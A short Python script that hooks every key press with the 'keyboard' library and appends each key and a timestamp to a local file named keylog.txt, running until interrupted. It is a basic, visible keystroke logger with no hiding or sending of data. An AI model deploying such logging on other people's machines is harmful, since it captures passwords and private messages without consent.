import keyboard
import time

def save_to_file(key):
    with open("keylog.txt", "a") as f:
        f.write(f"{key} pressed at {time.ctime()}\n")

try:
    keyboard.on_press(save_to_file)
    print("Press Ctrl+C to exit.")
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nSee you later!")
